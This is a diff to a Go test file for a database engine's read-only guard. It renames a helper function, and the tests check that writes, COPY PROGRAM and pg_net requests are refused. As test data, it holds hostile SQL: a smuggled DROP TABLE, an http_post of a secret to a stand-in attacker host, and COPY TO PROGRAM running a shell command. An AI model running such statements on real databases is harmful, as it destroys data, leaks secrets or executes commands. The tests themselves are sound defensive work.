@@ -51,15 +51,15 @@ func TestWritesAreRefused(t *testing.T) {
 		{"COMMIT then DROP TABLE", "COMMIT; DROP TABLE t", "42601"}, // one statement per query
 	} {
 		t.Run(tc.name, func(t *testing.T) {
-			before := observe(t, watch, stateSQL)
+			before := testdb.Value[string](t, watch, stateSQL)
 			_, err := m.Query(t.Context(), db, engine.Query{SQL: tc.sql})
 			wantSQLState(t, err, tc.state)
-			if after := observe(t, watch, stateSQL); after != before {
+			if after := testdb.Value[string](t, watch, stateSQL); after != before {
 				t.Errorf("state changed from %s to %s", before, after)
 			}
 		})
 	}
-	if ran := observe(t, watch, "SELECT (pg_stat_file('/tmp/engine_copy_from_ran', true) IS NOT NULL)::text"); ran != "false" {
+	if ran := testdb.Value[string](t, watch, "SELECT (pg_stat_file('/tmp/engine_copy_from_ran', true) IS NOT NULL)::text"); ran != "false" {
 		t.Error("COPY FROM PROGRAM started its program")
 	}
 }
@@ -70,10 +70,10 @@ func TestPgNetRequestIsRefused(t *testing.T) {
 	watch := testdb.Conn(t, testdb.Superuser, testdb.DBSupabase)
 
 	const queued = "SELECT count(*)::text FROM net.http_request_queue"
-	before := observe(t, watch, queued)
+	before := testdb.Value[string](t, watch, queued)
 	_, err := m.Query(t.Context(), db, engine.Query{SQL: "SELECT net.http_post('https://attacker.invalid/exfil', 'secret')"})
 	wantSQLState(t, err, "25006")
-	if after := observe(t, watch, queued); after != before {
+	if after := testdb.Value[string](t, watch, queued); after != before {
 		t.Errorf("queued requests went from %s to %s", before, after)
 	}
 }
@@ -104,10 +104,10 @@ func TestReadOnlyCannotBeTurnedOff(t *testing.T) {
 				t.Errorf("%s: %v", tc.sql, err)
 			}
 
-			before := observe(t, watch, stateSQL)
+			before := testdb.Value[string](t, watch, stateSQL)
 			_, err = m.Query(t.Context(), db, engine.Query{SQL: "INSERT INTO t VALUES (100, 'after')"})
 			wantSQLState(t, err, "25006")
-			if after := observe(t, watch, stateSQL); after != before {
+			if after := testdb.Value[string](t, watch, stateSQL); after != before {
 				t.Errorf("state changed from %s to %s", before, after)
 			}
 
@@ -134,13 +134,13 @@ func TestGapsOwnedByTheGuard(t *testing.T) {
 		if got != "INSERT 0 1" {
 			t.Errorf("dblink_exec = %s", got)
 		}
-		if v := observe(t, watch, "SELECT v FROM t WHERE id = 1"); v != "via dblink" {
+		if v := testdb.Value[string](t, watch, "SELECT v FROM t WHERE id = 1"); v != "via dblink" {
 			t.Errorf("row written through dblink = %q", v)
 		}
 	})
 	t.Run("COPY TO PROGRAM runs a shell command", func(t *testing.T) {
 		mustQuery(t, m, engine.Query{SQL: "COPY (SELECT 'ran') TO PROGRAM 'cat > /tmp/engine_copy_to_program'"})
-		if out := observe(t, watch, "SELECT pg_read_file('/tmp/engine_copy_to_program')"); out != "ran\n" {
+		if out := testdb.Value[string](t, watch, "SELECT pg_read_file('/tmp/engine_copy_to_program')"); out != "ran\n" {
 			t.Errorf("program output = %q", out)
 		}
 	})
